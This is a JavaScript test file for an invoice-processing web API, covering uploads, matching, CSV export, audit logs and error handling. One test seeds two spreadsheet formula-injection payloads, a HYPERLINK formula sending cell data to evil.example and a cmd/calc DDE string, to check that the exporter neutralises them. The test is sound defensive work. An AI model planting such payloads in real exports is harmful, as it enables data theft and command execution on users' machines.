import request from "supertest";
import { app } from "../src/app.js";
import { Invoice } from "../src/models/index.js";
import { authHeader, resetDb, signup } from "./testUtils.js";

beforeEach(resetDb);

async function makeInvoice(orgId, overrides = {}) {
  return Invoice.create({
    orgId,
    originalFilename: "test.pdf",
    storagePath: "/tmp/does-not-matter.pdf",
    contentType: "application/pdf",
    status: "extracted",
    vendorName: "Acme Supplies Inc",
    invoiceNumber: "INV-1",
    total: 1000.0,
    overallConfidence: 0.95,
    ...overrides,
  });
}

async function orgId(token) {
  const res = await request(app).get("/api/auth/me").set(authHeader(token));
  return res.body.org_id;
}

test("health", async () => {
  const res = await request(app).get("/api/health");
  expect(res.status).toBe(200);
  expect(res.body).toEqual({ status: "ok" });
});

test("upload rejects unsupported file type", async () => {
  const token = await signup(app, request);
  const res = await request(app)
    .post("/api/invoices/upload")
    .set(authHeader(token))
    .attach("file", Buffer.from("hello"), { filename: "notes.txt", contentType: "text/plain" });
  expect(res.status).toBe(422);
});

test("matching upload and run", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  const csv = "vendor,amount,date,reference\nAcme Supplies Inc,1000.00,2026-01-05,PO-1\n";
  let res = await request(app)
    .post("/api/matching/sources?source_type=po")
    .set(authHeader(token))
    .attach("file", Buffer.from(csv), { filename: "po.csv", contentType: "text/csv" });
  expect(res.status).toBe(201);
  expect(res.body.entry_count).toBe(1);

  res = await request(app).post("/api/matching/run").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.invoices_evaluated).toBe(1);
  expect(res.body.matched).toBe(1);

  res = await request(app).get("/api/matching/results").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body[0].invoice_id).toBe(invoice.id);
  expect(res.body[0].status).toBe("matched");
});

test("matching source requires vendor and amount columns", async () => {
  const token = await signup(app, request);
  const csv = "foo,bar\n1,2\n";
  const res = await request(app)
    .post("/api/matching/sources?source_type=bank")
    .set(authHeader(token))
    .attach("file", Buffer.from(csv), { filename: "bad.csv", contentType: "text/csv" });
  expect(res.status).toBe(422);
});

test("export csv", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org);

  const res = await request(app).get("/api/export/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.text).toContain("Acme Supplies Inc");
});

test("export csv neutralizes formula-injection payloads instead of exporting live formulas", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  await makeInvoice(org, {
    vendorName: '=HYPERLINK("http://evil.example/steal?x="&A1,"Click")',
    originalFilename: "@SUM(1+1)*cmd|'/c calc'!A1",
  });

  const res = await request(app).get("/api/export/csv").set(authHeader(token));
  expect(res.status).toBe(200);
  // vendor_name contains a comma/quote, so csv-quoting wraps the field in
  // "..." -- the sanitizer's apostrophe must appear right after that
  // opening quote, not just anywhere before "HYPERLINK" (a naive regex
  // checking "no quote/apostrophe immediately before" would pass even
  // unsanitized here, since CSV's own quoting also inserts a `"` there).
  expect(res.text).toContain('"\'=HYPERLINK(');
  expect(res.text).not.toContain('"=HYPERLINK(');
  // original_filename has no special CSV characters, so it's written
  // unquoted -- the apostrophe must sit directly after the preceding comma.
  expect(res.text).toContain(",'@SUM(1+1)");
  expect(res.text).not.toContain(",@SUM(1+1)");
});

test("invoice correction writes audit log", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  let res = await request(app)
    .patch(`/api/invoices/${invoice.id}`)
    .set(authHeader(token))
    .send({ vendor_name: "Acme Corrected" });
  expect(res.status).toBe(200);
  expect(res.body.vendor_name).toBe("Acme Corrected");

  res = await request(app).get(`/api/invoices/${invoice.id}/audit-log`).set(authHeader(token));
  const actions = res.body.map((e) => e.action);
  expect(actions).toContain("human_correction");
});

test("correcting a vendor name teaches it as an alias for next time", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org); // default vendorName: "Acme Supplies Inc"

  const res = await request(app)
    .patch(`/api/invoices/${invoice.id}`)
    .set(authHeader(token))
    .send({ vendor_name: "Acme Corrected" });
  expect(res.status).toBe(200);

  const { lookupVendorAlias } = await import("../src/vendorAlias.js");
  const alias = await lookupVendorAlias(org, "Acme Supplies Inc");
  expect(alias.canonicalVendorName).toBe("Acme Corrected");
});

test("approve invoice", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org);

  const res = await request(app).post(`/api/invoices/${invoice.id}/approve`).set(authHeader(token));
  expect(res.status).toBe(200);
  expect(res.body.status).toBe("approved");
});

test("fetching a source file that no longer exists on disk returns a clean 404, not a raw path-leaking 500", async () => {
  const token = await signup(app, request);
  const org = await orgId(token);
  const invoice = await makeInvoice(org); // storagePath points at a file that was never actually written

  const res = await request(app).get(`/api/invoices/${invoice.id}/file`).set(authHeader(token));
  expect(res.status).toBe(404);
  expect(res.body.detail).not.toMatch(/\/tmp\//); // shouldn't leak the server-side storage path
});
